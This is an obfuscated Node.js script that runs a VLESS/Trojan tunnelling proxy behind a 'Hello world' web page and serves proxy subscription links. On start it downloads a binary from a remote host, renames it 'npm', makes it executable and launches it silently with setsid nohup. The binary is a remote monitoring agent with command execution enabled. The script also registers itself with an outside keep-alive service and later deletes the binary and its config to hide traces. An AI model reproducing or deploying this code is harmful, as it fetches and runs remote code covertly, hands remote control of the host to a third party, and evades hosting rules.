const _0x3c5fc7=_0x20cd;(function(_0x357304,_0x359347){const _0xa8bf1b={_0x589eab:0xe0,_0x3c4bc2:0x14d,_0x28c172:0x130,_0x437f4a:0x101,_0x5162d0:0xe9,_0x3b0b95:0xe8},_0x18e407=_0x20cd,_0x65627d=_0x357304();while(!![]){try{const _0x262b93=-parseInt(_0x18e407(0xf1))/0x1+parseInt(_0x18e407(_0xa8bf1b._0x589eab))/0x2+parseInt(_0x18e407(_0xa8bf1b._0x3c4bc2))/0x3*(-parseInt(_0x18e407(0xe6))/0x4)+parseInt(_0x18e407(_0xa8bf1b._0x28c172))/0x5*(parseInt(_0x18e407(0xf8))/0x6)+parseInt(_0x18e407(0xcd))/0x7*(parseInt(_0x18e407(_0xa8bf1b._0x437f4a))/0x8)+-parseInt(_0x18e407(0xd2))/0x9*(-parseInt(_0x18e407(_0xa8bf1b._0x5162d0))/0xa)+-parseInt(_0x18e407(0x10b))/0xb*(parseInt(_0x18e407(_0xa8bf1b._0x3b0b95))/0xc);if(_0x262b93===_0x359347)break;else _0x65627d['push'](_0x65627d['shift']());}catch(_0x52113a){_0x65627d['push'](_0x65627d['shift']());}}}(_0x12a9,0x4bbf8));const os=require('os'),http=require(_0x3c5fc7(0x124)),fs=require('fs'),axios=require('axios'),net=require(_0x3c5fc7(0x12b)),path=require(_0x3c5fc7(0xcf)),crypto=require(_0x3c5fc7(0x12f)),{Buffer}=require(_0x3c5fc7(0x135)),{exec,execSync}=require(_0x3c5fc7(0x111)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3c5fc7(0xe1)][_0x3c5fc7(0x12e)]||'688344b1-53f1-4a77-8381-95b1de01c8c1',NEZHA_SERVER=process[_0x3c5fc7(0xe1)][_0x3c5fc7(0x14e)]||'',NEZHA_PORT=process[_0x3c5fc7(0xe1)][_0x3c5fc7(0x116)]||'',NEZHA_KEY=process[_0x3c5fc7(0xe1)][_0x3c5fc7(0xff)]||'',DOMAIN=process[_0x3c5fc7(0xe1)][_0x3c5fc7(0x117)]||_0x3c5fc7(0x105),AUTO_ACCESS=process[_0x3c5fc7(0xe1)][_0x3c5fc7(0xfa)]||!![],WSPATH=process['env'][_0x3c5fc7(0x13d)]||UUID[_0x3c5fc7(0xf6)](0x0,0x8),SUB_PATH=process[_0x3c5fc7(0xe1)][_0x3c5fc7(0xfb)]||_0x3c5fc7(0xed),NAME=process[_0x3c5fc7(0xe1)][_0x3c5fc7(0xe5)]||'',PORT=process['env'][_0x3c5fc7(0xd0)]||0x1eb4;let ISP='';function _0x20cd(_0x12df30,_0x163ee8){const _0x12a974=_0x12a9();return _0x20cd=function(_0x20cdb7,_0x53cd14){_0x20cdb7=_0x20cdb7-0xcc;let _0x264d76=_0x12a974[_0x20cdb7];return _0x264d76;},_0x20cd(_0x12df30,_0x163ee8);}const GetISP=async()=>{const _0x4c82ce={_0x224ab5:0x100,_0x2f1227:0x11d,_0x92ba2c:0x115,_0x5836ec:0xfd,_0x11b263:0x10a},_0x4d3c4e=_0x3c5fc7;try{const _0x37df6f=await axios[_0x4d3c4e(_0x4c82ce._0x224ab5)](_0x4d3c4e(_0x4c82ce._0x2f1227)),_0x2ae206=_0x37df6f[_0x4d3c4e(_0x4c82ce._0x92ba2c)];ISP=(_0x2ae206[_0x4d3c4e(_0x4c82ce._0x5836ec)]+'-'+_0x2ae206[_0x4d3c4e(_0x4c82ce._0x11b263)])[_0x4d3c4e(0x134)](/ /g,'_');}catch(_0x545fbc){ISP='Unknown';}};function _0x12a9(){const _0x4b95f5=['decode','3ORVobl','NEZHA_SERVER','log','84vYYpBM','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','path','PORT','Status','729TWnEKW','application/dns-json','2083','substr','https://arm64.ssss.nyc.mn/agent','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','test','length','setsid\x20nohup\x20./npm\x20-s\x20','createWriteStream','base64','1.1.1.1','2087','close','823774KbuFUR','env','arch','concat','vless://','NAME','1558556jhmBmy','sha224','9182652xOGVrL','30830XZJWWx','application/json','Hello\x20world!','unlink','ghghgh','hex','aarch64','config.yaml','52192SMUBxH','readUInt16BE','find','pop','writeHead','slice','catch','25302lVjFvY','readUInt8','AUTO_ACCESS','SUB_PATH','error:\x20','country_code','write','NEZHA_KEY','get','362432imtaLd',':443?security=tls&sni=','https://oooo.serv00.net/add-url','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','1234.abc.com','toString','arm64','Automatic\x20Access\x20Task\x20added\x20successfully','2053','isp','11FskxYd','trojan://','https://arm64.ssss.nyc.mn/v1','&fp=chrome&type=ws&host=','trim','arm','child_process','Failed\x20to\x20resolve\x20','&type=A','text/plain','data','NEZHA_PORT','DOMAIN','npm','update','pipe','every','url','https://api.ip.sb/geoip','8.8.4.4','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','end','true','https://amd64.ssss.nyc.mn/v1','\x20-p\x20','http','https://dns.google/resolve?name=','utf8','npm\x20running\x20error:','https://','error','Server\x20is\x20running\x20on\x20port\x20','net','listen',':443?encryption=none&security=tls&sni=','UUID','crypto','370RbbCay','utf-8','createServer','connect','replace','buffer','reduce','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','map','connection','Not\x20Found\x0a','message','finish','WSPATH','\x20with\x20all\x20DNS\x20servers','https://amd64.ssss.nyc.mn/agent','--tls','Answer','stream','443','npm\x20download\x20successfully','then','includes','chmod\x20+x\x20npm','false','join','type','send'];_0x12a9=function(){return _0x4b95f5;};return _0x12a9();}GetISP();const httpServer=http[_0x3c5fc7(0x132)]((_0x12cf7b,_0x36fae3)=>{const _0x39b8a6={_0x2f3e9b:0x11c,_0x2a0c07:0x126,_0x5edc39:0xe4,_0x2729fd:0x12d,_0x8f7f95:0x10e,_0x526cec:0xf5,_0x348ec5:0x114,_0x369317:0xf5,_0x50ad81:0x13a},_0x5d4a6a={_0x5480f0:0xf5,_0xe3fe32:0x120},_0x5e4591=_0x3c5fc7;if(_0x12cf7b[_0x5e4591(_0x39b8a6._0x2f3e9b)]==='/'){const _0x1731f2=path[_0x5e4591(0x149)](__dirname,'index.html');fs['readFile'](_0x1731f2,_0x5e4591(_0x39b8a6._0x2a0c07),(_0x3db18f,_0x2cff86)=>{const _0x18df02=_0x5e4591;if(_0x3db18f){_0x36fae3[_0x18df02(_0x5d4a6a._0x5480f0)](0xc8,{'Content-Type':'text/html'}),_0x36fae3[_0x18df02(_0x5d4a6a._0xe3fe32)](_0x18df02(0xeb));return;}_0x36fae3[_0x18df02(_0x5d4a6a._0x5480f0)](0xc8,{'Content-Type':'text/html'}),_0x36fae3[_0x18df02(0x120)](_0x2cff86);});return;}else{if(_0x12cf7b[_0x5e4591(_0x39b8a6._0x2f3e9b)]==='/'+SUB_PATH){const _0x157f4f=NAME?NAME+'-'+ISP:ISP,_0x2710e9=_0x5e4591(_0x39b8a6._0x5edc39)+UUID+'@'+DOMAIN+_0x5e4591(_0x39b8a6._0x2729fd)+DOMAIN+_0x5e4591(_0x39b8a6._0x8f7f95)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x157f4f,_0x2d232a=_0x5e4591(0x10c)+UUID+'@'+DOMAIN+_0x5e4591(0x102)+DOMAIN+_0x5e4591(_0x39b8a6._0x8f7f95)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x157f4f,_0x481a6d=_0x2710e9+'\x0a'+_0x2d232a,_0x500adc=Buffer['from'](_0x481a6d)[_0x5e4591(0x106)](_0x5e4591(0xdc));_0x36fae3[_0x5e4591(_0x39b8a6._0x526cec)](0xc8,{'Content-Type':_0x5e4591(_0x39b8a6._0x348ec5)}),_0x36fae3[_0x5e4591(0x120)](_0x500adc+'\x0a');}else _0x36fae3[_0x5e4591(_0x39b8a6._0x369317)](0x194,{'Content-Type':_0x5e4591(0x114)}),_0x36fae3[_0x5e4591(0x120)](_0x5e4591(_0x39b8a6._0x50ad81));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x3c5fc7(0x134)](/-/g,''),DNS_SERVERS=[_0x3c5fc7(0x11e),_0x3c5fc7(0xdd)];function resolveHost(_0x5e8c20){return new Promise((_0x306e38,_0x38876d)=>{const _0xfe298f={_0x391719:0x125,_0x30bf44:0x100,_0x368218:0xd3},_0x2bc385={_0x336657:0xd1,_0x30587c:0x141,_0x5ab390:0xf3,_0x46ff0b:0x115},_0x515acc=_0x20cd;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x515acc(0xd8)](_0x5e8c20)){_0x306e38(_0x5e8c20);return;}let _0x68f8d7=0x0;function _0x4de3ef(){const _0x4bcdad=_0x515acc;if(_0x68f8d7>=DNS_SERVERS[_0x4bcdad(0xd9)]){_0x38876d(new Error(_0x4bcdad(0x112)+_0x5e8c20+_0x4bcdad(0x13e)));return;}const _0x43b0e7=DNS_SERVERS[_0x68f8d7];_0x68f8d7++;const _0x35f452=_0x4bcdad(_0xfe298f._0x391719)+encodeURIComponent(_0x5e8c20)+_0x4bcdad(0x113);axios[_0x4bcdad(_0xfe298f._0x30bf44)](_0x35f452,{'timeout':0x1388,'headers':{'Accept':_0x4bcdad(_0xfe298f._0x368218)}})[_0x4bcdad(0x145)](_0x3fed79=>{const _0x3b37d7=_0x4bcdad,_0x13739a=_0x3fed79['data'];if(_0x13739a[_0x3b37d7(_0x2bc385._0x336657)]===0x0&&_0x13739a['Answer']&&_0x13739a[_0x3b37d7(_0x2bc385._0x30587c)][_0x3b37d7(0xd9)]>0x0){const _0x2e8d0d=_0x13739a['Answer'][_0x3b37d7(_0x2bc385._0x5ab390)](_0x17ee98=>_0x17ee98[_0x3b37d7(0x14a)]===0x1);if(_0x2e8d0d){_0x306e38(_0x2e8d0d[_0x3b37d7(_0x2bc385._0x46ff0b)]);return;}}_0x4de3ef();})['catch'](_0x45c9d4=>{_0x4de3ef();});}_0x4de3ef();});}function handleVlessConnection(_0x24505b,_0x4731d8){const _0x5499ca={_0x5b0a94:0xf6,_0x3f9e52:0xf6,_0x33285d:0x136,_0x5bcf86:0x14b,_0x38856f:0x145},_0x4e26d4={_0x494e73:0xfe,_0x3a848a:0x129},_0x4fe50f={_0x389ee2:0xf6,_0x416480:0x129,_0x5bafe2:0x11a},_0x56da68=_0x3c5fc7,[_0x53539f]=_0x4731d8,_0xb9ac47=_0x4731d8[_0x56da68(_0x5499ca._0x5b0a94)](0x1,0x11);if(!_0xb9ac47[_0x56da68(0x11b)]((_0x188efc,_0x1bfa9c)=>_0x188efc==parseInt(uuid[_0x56da68(0xd5)](_0x1bfa9c*0x2,0x2),0x10)))return![];let _0x4c562f=_0x4731d8['slice'](0x11,0x12)[_0x56da68(0xf9)]()+0x13;const _0x2ce4ce=_0x4731d8[_0x56da68(_0x5499ca._0x5b0a94)](_0x4c562f,_0x4c562f+=0x2)[_0x56da68(0xf2)](0x0),_0x265641=_0x4731d8['slice'](_0x4c562f,_0x4c562f+=0x1)['readUInt8'](),_0x2d5710=_0x265641==0x1?_0x4731d8['slice'](_0x4c562f,_0x4c562f+=0x4)[_0x56da68(0x149)]('.'):_0x265641==0x2?new TextDecoder()[_0x56da68(0x14c)](_0x4731d8[_0x56da68(0xf6)](_0x4c562f+0x1,_0x4c562f+=0x1+_0x4731d8[_0x56da68(_0x5499ca._0x3f9e52)](_0x4c562f,_0x4c562f+0x1)[_0x56da68(0xf9)]())):_0x265641==0x3?_0x4731d8[_0x56da68(0xf6)](_0x4c562f,_0x4c562f+=0x10)[_0x56da68(_0x5499ca._0x33285d)]((_0x57d1fc,_0x5d8869,_0x161d01,_0x1d0daa)=>_0x161d01%0x2?_0x57d1fc['concat'](_0x1d0daa[_0x56da68(0xf6)](_0x161d01-0x1,_0x161d01+0x1)):_0x57d1fc,[])[_0x56da68(0x138)](_0x3a9b6e=>_0x3a9b6e[_0x56da68(0xf2)](0x0)[_0x56da68(0x106)](0x10))['join'](':'):'';_0x24505b[_0x56da68(_0x5499ca._0x5bcf86)](new Uint8Array([_0x53539f,0x0]));const _0x103917=createWebSocketStream(_0x24505b);return resolveHost(_0x2d5710)[_0x56da68(_0x5499ca._0x38856f)](_0x416b76=>{const _0x5c50cd=_0x56da68;net['connect']({'host':_0x416b76,'port':_0x2ce4ce},function(){const _0x2b21ed=_0x20cd;this[_0x2b21ed(0xfe)](_0x4731d8[_0x2b21ed(_0x4fe50f._0x389ee2)](_0x4c562f)),_0x103917['on'](_0x2b21ed(_0x4fe50f._0x416480),()=>{})[_0x2b21ed(_0x4fe50f._0x5bafe2)](this)['on']('error',()=>{})[_0x2b21ed(0x11a)](_0x103917);})['on'](_0x5c50cd(0x129),()=>{});})[_0x56da68(0xf7)](_0x471fa2=>{net['connect']({'host':_0x2d5710,'port':_0x2ce4ce},function(){const _0xa685cd=_0x20cd;this[_0xa685cd(_0x4e26d4._0x494e73)](_0x4731d8[_0xa685cd(0xf6)](_0x4c562f)),_0x103917['on'](_0xa685cd(0x129),()=>{})[_0xa685cd(0x11a)](this)['on'](_0xa685cd(_0x4e26d4._0x3a848a),()=>{})['pipe'](_0x103917);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x216065,_0x552dcf){const _0xb48f01={_0x17de38:0xd9,_0x903555:0xf6,_0x24294a:0xe7,_0x1c5152:0x119,_0x560ccb:0x149,_0x37fb21:0xf6,_0x442ed1:0x138,_0x5673e9:0xf2,_0xc1f110:0xd9,_0x40b336:0xf7},_0x385d76={_0x249aea:0x133},_0x2327e1={_0xa1ac6:0x133,_0x54c36f:0x129},_0x26a70e={_0x557386:0x129,_0xddc957:0x11a},_0x622360=_0x3c5fc7;try{if(_0x552dcf[_0x622360(_0xb48f01._0x17de38)]<0x3a)return![];const _0x4dc6b7=_0x552dcf[_0x622360(_0xb48f01._0x903555)](0x0,0x38)[_0x622360(0x106)](),_0x22871c=[UUID];let _0x15eb1d=null;for(const _0x3085c2 of _0x22871c){const _0x3d776d=crypto['createHash'](_0x622360(_0xb48f01._0x24294a))[_0x622360(_0xb48f01._0x1c5152)](_0x3085c2)['digest'](_0x622360(0xee));if(_0x3d776d===_0x4dc6b7){_0x15eb1d=_0x3085c2;break;}}if(!_0x15eb1d)return![];let _0x3856b6=0x38;_0x552dcf[_0x3856b6]===0xd&&_0x552dcf[_0x3856b6+0x1]===0xa&&(_0x3856b6+=0x2);const _0xc40fb9=_0x552dcf[_0x3856b6];if(_0xc40fb9!==0x1)return![];_0x3856b6+=0x1;const _0x27d55a=_0x552dcf[_0x3856b6];_0x3856b6+=0x1;let _0x57ef40,_0x598621;if(_0x27d55a===0x1)_0x57ef40=_0x552dcf['slice'](_0x3856b6,_0x3856b6+0x4)[_0x622360(_0xb48f01._0x560ccb)]('.'),_0x3856b6+=0x4;else{if(_0x27d55a===0x3){const _0x77a50a=_0x552dcf[_0x3856b6];_0x3856b6+=0x1,_0x57ef40=_0x552dcf[_0x622360(_0xb48f01._0x37fb21)](_0x3856b6,_0x3856b6+_0x77a50a)[_0x622360(0x106)](),_0x3856b6+=_0x77a50a;}else{if(_0x27d55a===0x4)_0x57ef40=_0x552dcf[_0x622360(0xf6)](_0x3856b6,_0x3856b6+0x10)[_0x622360(0x136)]((_0x3b8ea9,_0x276110,_0x4d5ad2,_0x9a4bf1)=>_0x4d5ad2%0x2?_0x3b8ea9[_0x622360(0xe3)](_0x9a4bf1[_0x622360(0xf6)](_0x4d5ad2-0x1,_0x4d5ad2+0x1)):_0x3b8ea9,[])[_0x622360(_0xb48f01._0x442ed1)](_0x178eaf=>_0x178eaf[_0x622360(0xf2)](0x0)[_0x622360(0x106)](0x10))['join'](':'),_0x3856b6+=0x10;else return![];}}_0x598621=_0x552dcf[_0x622360(_0xb48f01._0x5673e9)](_0x3856b6),_0x3856b6+=0x2;_0x3856b6<_0x552dcf[_0x622360(_0xb48f01._0xc1f110)]&&_0x552dcf[_0x3856b6]===0xd&&_0x552dcf[_0x3856b6+0x1]===0xa&&(_0x3856b6+=0x2);const _0x5f50d1=createWebSocketStream(_0x216065);return resolveHost(_0x57ef40)['then'](_0x2a88e7=>{const _0x1aea94=_0x622360;net[_0x1aea94(_0x2327e1._0xa1ac6)]({'host':_0x2a88e7,'port':_0x598621},function(){const _0x118824=_0x1aea94;_0x3856b6<_0x552dcf[_0x118824(0xd9)]&&this['write'](_0x552dcf[_0x118824(0xf6)](_0x3856b6)),_0x5f50d1['on'](_0x118824(_0x26a70e._0x557386),()=>{})[_0x118824(_0x26a70e._0xddc957)](this)['on'](_0x118824(_0x26a70e._0x557386),()=>{})['pipe'](_0x5f50d1);})['on'](_0x1aea94(_0x2327e1._0x54c36f),()=>{});})[_0x622360(_0xb48f01._0x40b336)](_0x3f7641=>{const _0x113278={_0x5d4c43:0xf6,_0x4f3f7a:0x129,_0x23c131:0x11a},_0x18e0b1=_0x622360;net[_0x18e0b1(_0x385d76._0x249aea)]({'host':_0x57ef40,'port':_0x598621},function(){const _0x409681=_0x18e0b1;_0x3856b6<_0x552dcf['length']&&this['write'](_0x552dcf[_0x409681(_0x113278._0x5d4c43)](_0x3856b6)),_0x5f50d1['on']('error',()=>{})[_0x409681(0x11a)](this)['on'](_0x409681(_0x113278._0x4f3f7a),()=>{})[_0x409681(_0x113278._0x23c131)](_0x5f50d1);})['on'](_0x18e0b1(0x129),()=>{});}),!![];}catch(_0x1e2417){return![];}}wss['on'](_0x3c5fc7(0x139),(_0x33d93e,_0x4b0525)=>{const _0x5c16cb={_0x22fbe6:0x13b},_0x1ba6cc={_0x5a61ff:0x11b},_0x177dc4=_0x3c5fc7,_0x1c66da=_0x4b0525['url']||'';_0x33d93e['once'](_0x177dc4(_0x5c16cb._0x22fbe6),_0x2fa788=>{const _0x52bfb6=_0x177dc4;if(_0x2fa788[_0x52bfb6(0xd9)]>0x11&&_0x2fa788[0x0]===0x0){const _0x21ba57=_0x2fa788[_0x52bfb6(0xf6)](0x1,0x11),_0x787199=_0x21ba57[_0x52bfb6(_0x1ba6cc._0x5a61ff)]((_0x5c6a3e,_0x253c25)=>_0x5c6a3e==parseInt(uuid[_0x52bfb6(0xd5)](_0x253c25*0x2,0x2),0x10));if(_0x787199){!handleVlessConnection(_0x33d93e,_0x2fa788)&&_0x33d93e[_0x52bfb6(0xdf)]();return;}}!handleTrojanConnection(_0x33d93e,_0x2fa788)&&_0x33d93e[_0x52bfb6(0xdf)]();})['on'](_0x177dc4(0x129),()=>{});});const getDownloadUrl=()=>{const _0x4202ce={_0x3a27cd:0xe2,_0x482be2:0xef},_0x55a265=_0x3c5fc7,_0x59c0df=os[_0x55a265(_0x4202ce._0x3a27cd)]();return _0x59c0df===_0x55a265(0x110)||_0x59c0df===_0x55a265(0x107)||_0x59c0df===_0x55a265(_0x4202ce._0x482be2)?!NEZHA_PORT?_0x55a265(0x10d):_0x55a265(0xd6):!NEZHA_PORT?_0x55a265(0x122):_0x55a265(0x13f);},downloadFile=async()=>{const _0x48d2ac={_0x358c78:0x142,_0x178953:0xdb,_0x50340d:0x118,_0x55d213:0x115,_0x316496:0x11a},_0x4502a2={_0x2eb848:0x13c},_0x46b44f=_0x3c5fc7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3c081b=getDownloadUrl(),_0x378ebd=await axios({'method':_0x46b44f(0x100),'url':_0x3c081b,'responseType':_0x46b44f(_0x48d2ac._0x358c78)}),_0x3cc600=fs[_0x46b44f(_0x48d2ac._0x178953)](_0x46b44f(_0x48d2ac._0x50340d));return _0x378ebd[_0x46b44f(_0x48d2ac._0x55d213)][_0x46b44f(_0x48d2ac._0x316496)](_0x3cc600),new Promise((_0x2b81c1,_0x52a855)=>{const _0x530e9e={_0x31e3d1:0x147},_0x448a81=_0x46b44f;_0x3cc600['on'](_0x448a81(_0x4502a2._0x2eb848),()=>{const _0x2269de=_0x448a81;console[_0x2269de(0xcc)](_0x2269de(0x144)),exec(_0x2269de(_0x530e9e._0x31e3d1),_0x5f215a=>{if(_0x5f215a)_0x52a855(_0x5f215a);_0x2b81c1();});}),_0x3cc600['on']('error',_0x52a855);});}catch(_0x52a3ca){throw _0x52a3ca;}},runnz=async()=>{const _0x165634={_0x3cc824:0xce,_0x2aef24:0x131,_0x163186:0x10f,_0x4fbc61:0xcc,_0x10b00d:0x109,_0x5db63e:0x140,_0xa5f79c:0x11f,_0x338864:0x146,_0x556357:0xf4,_0xedafc7:0x121,_0x26a1b4:0xfc},_0x48a33d={_0x52dc07:0x129},_0x2c8405=_0x3c5fc7;try{const _0x3db4d7=execSync(_0x2c8405(_0x165634._0x3cc824),{'encoding':_0x2c8405(_0x165634._0x2aef24)});if(_0x3db4d7[_0x2c8405(_0x165634._0x163186)]()!==''){console[_0x2c8405(_0x165634._0x4fbc61)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x22d560){}await downloadFile();let _0x576132='',_0x539b57=[_0x2c8405(0x143),'8443','2096',_0x2c8405(0xde),_0x2c8405(0xd4),_0x2c8405(_0x165634._0x10b00d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x42b780=_0x539b57['includes'](NEZHA_PORT)?_0x2c8405(_0x165634._0x5db63e):'';_0x576132=_0x2c8405(0xda)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2c8405(0x123)+NEZHA_KEY+'\x20'+_0x42b780+_0x2c8405(_0x165634._0xa5f79c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x22519f=NEZHA_SERVER[_0x2c8405(_0x165634._0x338864)](':')?NEZHA_SERVER['split'](':')[_0x2c8405(_0x165634._0x556357)]():'',_0x5c916e=_0x539b57[_0x2c8405(_0x165634._0x338864)](_0x22519f)?_0x2c8405(_0x165634._0xedafc7):_0x2c8405(0x148),_0x4f467d='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2c8405(0x104)+_0x5c916e+_0x2c8405(0x137)+UUID;fs['writeFileSync'](_0x2c8405(0xf0),_0x4f467d);}_0x576132='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x2c8405(0xcc)](_0x2c8405(0xd7));return;}}try{exec(_0x576132,{'shell':'/bin/bash'},_0x2c2b14=>{const _0x4afd9f=_0x2c8405;if(_0x2c2b14)console[_0x4afd9f(_0x48a33d._0x52dc07)](_0x4afd9f(0x127),_0x2c2b14);else console[_0x4afd9f(0xcc)]('npm\x20is\x20running');});}catch(_0x1012b3){console[_0x2c8405(0x129)](_0x2c8405(_0x165634._0x26a1b4)+_0x1012b3);}};async function addAccessTask(){const _0x3e41b7={_0x1c46ae:0x128,_0x4e0eed:0x103,_0x110994:0x108},_0x1ce1eb=_0x3c5fc7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xd1c62d=_0x1ce1eb(_0x3e41b7._0x1c46ae)+DOMAIN;try{const _0x3c5504=await axios['post'](_0x1ce1eb(_0x3e41b7._0x4e0eed),{'url':_0xd1c62d},{'headers':{'Content-Type':_0x1ce1eb(0xea)}});console[_0x1ce1eb(0xcc)](_0x1ce1eb(_0x3e41b7._0x110994));}catch(_0x4a9c4c){}}const delFiles=()=>{const _0x3682c3={_0x511942:0xf0},_0x1f2093=_0x3c5fc7;fs[_0x1f2093(0xec)]('npm',()=>{}),fs['unlink'](_0x1f2093(_0x3682c3._0x511942),()=>{});};httpServer[_0x3c5fc7(0x12c)](PORT,()=>{const _0x1cdb65={_0x158a4e:0xcc,_0x591af1:0x12a},_0x349c06=_0x3c5fc7;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x349c06(_0x1cdb65._0x158a4e)](_0x349c06(_0x1cdb65._0x591af1)+PORT);});
